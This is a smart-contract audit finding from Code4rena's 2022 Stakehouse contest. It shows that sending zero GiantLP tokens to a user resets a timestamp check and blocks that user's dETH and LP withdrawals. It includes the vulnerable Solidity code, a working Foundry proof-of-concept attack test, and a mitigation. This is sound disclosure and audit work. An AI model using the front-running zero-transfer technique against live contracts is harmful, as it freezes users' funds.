## Tags

- bug
- 2 (Med Risk)
- primary issue
- satisfactory
- selected for report
- sponsor confirmed
- edited-by-warden
- M-01

# [Freezing of funds - Hacker can prevent users withdraws in giant pools](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/49) 

# Lines of code

https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L69
https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantSavETHVaultPool.sol#L66
https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L96


# Vulnerability details

## Impact

A hacker can prevent users from withdrawing dETH or LPTokens in giant pools.

This bug causes a revert in:
1. `WithdrawLP` - `GiantMevAndFeesPool`
2. `WithdrawLP` - `GiantSavETHVaultPool`
3. `WithdrawDETH` - `GiantSavETHVaultPool`

A hacker can prevent a user from receiving dETH when users are eligible and guaranteed to receive it through their stake.

This causes a liquidity crunch as the only funds that are possible to withdraw are ETH. There is not enough ETH in the giant pools to facilitate a large withdraw as ETH is staked for LPTokens and dETH.

The giant pools will become insolvent to returning ETH, dETH or vault LPTokens.

## Proof of Concept

Both `WithdrawLP` and `WithdrawDETH` act in a similar way:
1. loop LPtokens received for withdraw
2. Check user has enough Giant LP tokens to burn and pool has enough vault LP to give.
3. Check that a day has passed since user has interacted with Giant LP Token
4. burn tokens
5. send tokens

Example of `WithdrawDETH`:
https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantSavETHVaultPool.sol#L66
```
    function withdrawDETH(
        address[] calldata _savETHVaults,
        LPToken[][] calldata _lpTokens,
        uint256[][] calldata _amounts
    ) external {
        uint256 numOfVaults = _savETHVaults.length;
        require(numOfVaults > 0, "Empty arrays");
        require(numOfVaults == _lpTokens.length, "Inconsistent arrays");
        require(numOfVaults == _amounts.length, "Inconsistent arrays");

        // Firstly capture current dETH balance and see how much has been deposited after the loop
        uint256 dETHReceivedFromAllSavETHVaults = getDETH().balanceOf(address(this));
        for (uint256 i; i < numOfVaults; ++i) {
            SavETHVault vault = SavETHVault(_savETHVaults[i]);

            // Simultaneously check the status of LP tokens held by the vault and the giant LP balance of the user
            for (uint256 j; j < _lpTokens[i].length; ++j) {
                LPToken token = _lpTokens[i][j];
                uint256 amount = _amounts[i][j];

                // Check the user has enough giant LP to burn and that the pool has enough savETH vault LP
                _assertUserHasEnoughGiantLPToClaimVaultLP(token, amount);

                require(vault.isDETHReadyForWithdrawal(address(token)), "dETH is not ready for withdrawal");

                // Giant LP is burned 1:1 with LPs from sub-networks
                require(lpTokenETH.balanceOf(msg.sender) >= amount, "User does not own enough LP");

                // Burn giant LP from user before sending them dETH
                lpTokenETH.burn(msg.sender, amount);

                emit LPBurnedForDETH(address(token), msg.sender, amount);
            }

            // Ask
            vault.burnLPTokens(_lpTokens[i], _amounts[i]);
        }

        // Calculate how much dETH has been received from burning
        dETHReceivedFromAllSavETHVaults = getDETH().balanceOf(address(this)) - dETHReceivedFromAllSavETHVaults;

        // Send giant LP holder dETH owed
        getDETH().transfer(msg.sender, dETHReceivedFromAllSavETHVaults);
    }
```

The bug is in `_assertUserHasEnoughGiantLPToClaimVaultLP` in the last require that checks that a day has passed since the user has interacted with Giant LP Token:
https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L93
```
    function _assertUserHasEnoughGiantLPToClaimVaultLP(LPToken _token, uint256 _amount) internal view {
        require(_amount >= MIN_STAKING_AMOUNT, "Invalid amount");
        require(_token.balanceOf(address(this)) >= _amount, "Pool does not own specified LP");
        require(lpTokenETH.lastInteractedTimestamp(msg.sender) + 1 days < block.timestamp, "Too new");
    }
```

The condition `lpTokenETH.lastInteractedTimestamp(msg.sender) + 1 days < block.timestamp` can be set to fail by the hacker. The hacker  transfers 0 `lpTokenETH` tokens to  `msg.sender`. This transfer will update the `lastInteractedTimestamp` to now.

The above can be done once a day or on-demand by front-running the withdraw commands.

`_afterTokenTransfer` in `GiantLP.sol`:
https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantLP.sol#L43
```
    function _afterTokenTransfer(address _from, address _to, uint256 _amount) internal override {
        lastInteractedTimestamp[_from] = block.timestamp;
        lastInteractedTimestamp[_to] = block.timestamp;
        if (address(transferHookProcessor) != address(0)) ITransferHookProcessor(transferHookProcessor).afterTokenTransfer(_from, _to, _amount);
    }
```
### Foundry POC

The POC will show how a hacker prevents a user from receiving dETH although they are eligible to receive it.

Add the following test to `GiantPools.t.sol`:
https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/test/foundry/GiantPools.t.sol#L118
```
    function testPreventWithdraw() public {
        // Set up users and ETH
        address nodeRunner = accountOne; vm.deal(nodeRunner, 12 ether);
        address feesAndMevUserOne = accountTwo; vm.deal(feesAndMevUserOne, 4 ether);
        address savETHUser = accountThree; vm.deal(savETHUser, 24 ether);

        // Register BLS key
        registerSingleBLSPubKey(nodeRunner, blsPubKeyOne, accountFour);

        // Deposit 24 ETH into giant savETH
        vm.prank(savETHUser);
        giantSavETHPool.depositETH{value: 24 ether}(24 ether);
        assertEq(giantSavETHPool.lpTokenETH().balanceOf(savETHUser), 24 ether);
        assertEq(address(giantSavETHPool).balance, 24 ether);

        // Deploy 24 ETH from giant LP into savETH pool of LSDN instance
        bytes[][] memory blsKeysForVaults = new bytes[][](1);
        blsKeysForVaults[0] = getBytesArrayFromBytes(blsPubKeyOne);

        uint256[][] memory stakeAmountsForVaults = new uint256[][](1);
        stakeAmountsForVaults[0] = getUint256ArrayFromValues(24 ether);

        giantSavETHPool.batchDepositETHForStaking(
            getAddressArrayFromValues(address(manager.savETHVault())),
            getUint256ArrayFromValues(24 ether),
            blsKeysForVaults,
            stakeAmountsForVaults
        );
        assertEq(address(manager.savETHVault()).balance, 24 ether);

        // Deposit 4 ETH into giant fees and mev
        vm.startPrank(feesAndMevUserOne);
        giantFeesAndMevPool.depositETH{value: 4 ether}(4 ether);
        vm.stopPrank();

        assertEq(address(giantFeesAndMevPool).balance, 4 ether);
        stakeAmountsForVaults[0] = getUint256ArrayFromValues(4 ether);
        giantFeesAndMevPool.batchDepositETHForStaking(
            getAddressArrayFromValues(address(manager.stakingFundsVault())),
            getUint256ArrayFromValues(4 ether),
            blsKeysForVaults,
            stakeAmountsForVaults
        );

        // Ensure we can stake and mint derivatives
        stakeAndMintDerivativesSingleKey(blsPubKeyOne);

        IERC20 dETHToken = savETHVault.dETHToken();

        vm.startPrank(accountFive);
        dETHToken.transfer(address(savETHVault.saveETHRegistry()), 24 ether);
        vm.stopPrank();

        LPToken[] memory tokens = new LPToken[](1);
        tokens[0] = savETHVault.lpTokenForKnot(blsPubKeyOne);

        LPToken[][] memory allTokens = new LPToken[][](1);
        allTokens[0] = tokens;

        stakeAmountsForVaults[0] = getUint256ArrayFromValues(24 ether);

        // User will not have any dETH to start
        assertEq(dETHToken.balanceOf(savETHUser), 0);

        // Warp ahead -> savETHUser eligible to dETH
        vm.warp(block.timestamp + 2 days);

        // Send 0 tokens to savETHUser so he cannot withdrawDETH
        address hacker = address(0xdeadbeef);
        vm.startPrank(hacker);
        giantSavETHPool.lpTokenETH().transfer(savETHUser, 0);
        vm.stopPrank();
        address[] memory addresses = getAddressArrayFromValues(address(manager.savETHVault()));

        vm.startPrank(savETHUser);
        // Validate withdrawDETH will revert  
        vm.expectRevert("Too new");
        giantSavETHPool.withdrawDETH(addresses, allTokens, stakeAmountsForVaults);
        vm.stopPrank();    
    }
```

To run the POC execute: 
`yarn test -m "PreventWithdraw" -v`

Expected output: 
```
Running 1 test for test/foundry/GiantPools.t.sol:GiantPoolTests
[PASS] testPreventWithdraw() (gas: 3132637)
Test result: ok. 1 passed; 0 failed; finished in 9.25ms
```

To run with full trace, execute: `yarn test -m "PreventWithdraw" -vvvv`

## Tools Used

VS Code, Foundry

## Recommended Mitigation Steps

Make sure transfers in the GiantLP are only for funds larger than (0.001 ETH), this will make the exploitation expensive.